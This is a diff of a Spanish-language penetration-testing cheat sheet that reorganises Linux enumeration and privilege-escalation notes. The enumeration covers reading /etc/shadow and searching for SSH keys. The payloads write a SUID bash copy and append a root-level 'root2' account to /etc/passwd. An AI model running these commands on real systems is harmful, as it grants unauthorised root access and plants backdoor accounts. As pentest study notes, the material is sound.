@@ -2439,20 +2439,11 @@ cat /etc/issue
 cat /etc/os-release
 cat /proc/version
 cat /etc/shells
-lscpu
 ps aux
-env
-/usr/sbin/getcap -r / 2>/dev/null
-find \-writable 2>/dev/null | grep "etc"
-find / -writable -type f 2>/dev/null
-find / -writable -type d 2>/dev/null
-find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-crontab -l
-sudo crontab -l
-ls -lah /etc/cron*
 dpkg -l
-cat /etc/fstab
 mount
+cat /etc/fstab
+lscpu
 lsblk
 lsmod
 /sbin/modinfo libata
@@ -2464,8 +2455,8 @@ lsmod
 ip a
 ifconfig
 route
-ip route
 arp -a
+ip route
 ip neigh
 ss -anp
 netstat -net
@@ -2479,6 +2470,7 @@ cat /etc/iptables/rules.v4
 whoami
 id
 env
+history
 cat .bashrc
 cat /etc/passwd
 cat /etc/passwd | grep "sh$"
@@ -2486,13 +2478,29 @@ cat /etc/passwd | grep "sh$" | awk '{print $1}' FS=":"
 cat /etc/shadow
 cat /etc/group
 sudo -l
-history
 ```
 
 ##### Tareas Cron
 
 ```bash
+crontab -l
+sudo crontab -l
 cat /var/log/syslog
+ls -lah /etc/cron*
+```
+
+##### Capabilities
+
+```bash
+/usr/sbin/getcap -r / 2>/dev/null
+```
+
+##### Archivos y Directorios
+
+```bash
+find / -writable -type f 2>/dev/null
+find / -writable -type d 2>/dev/null
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
 
 ##### Búsqueda de credenciales
@@ -2518,9 +2526,19 @@ find / -name authorized_keys 2>/dev/null
 find / -name id_rsa 2>/dev/null
 ```
 
+##### Archivos con permisos de escritura
+
 ```bash
-#Con permiso de escritura sobre script en bash
-echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'> /home/user/overwrite.sh
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'> /home/user/.backups/script.sh
+```
+##### Abusando de Permisos inseguros
+
+Si por alguna razón podemos escribir en el archivo `/etc/passwd`, generamos el hash correspondiente y agregamos una línea a `/etc/passwd` usando el formato apropiado:
+
+```bash
+openssl passwd w00t
+echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+su - root2
 ```
 
 ##### Automatización
@@ -2529,18 +2547,22 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'> /home/user/overwrite.sh
 - [LinEnum](https://github.com/rebootuser/LinEnum)
 - [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
 
-##### Abusando de Permisos inseguros
-
-
-Si por alguna razón podemos escribir en el archivo `/etc/passwd`, generamos el hash correspondiente y agregaremos una línea a `/etc/passwd` usando el formato apropiado:
-
-```bash
-openssl passwd w00t
-echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
-su root2
-```
 
 ####  9.2.2. <a name='escalación-de-privilegios-2'></a>Escalación de Privilegios
+
+> Referencias: https://gtfobins.github.io/
+
+##### SUID
+##### Sudo
+##### Capabilities
+##### Tareas Cron
+##### Docker
+##### LXD
+##### Python Library Hijacking
+##### LD_PRELOAD Shared Library
+##### Shared Object
+
+
 
 ##  10. <a name='active-directory'></a>Active Directory
 
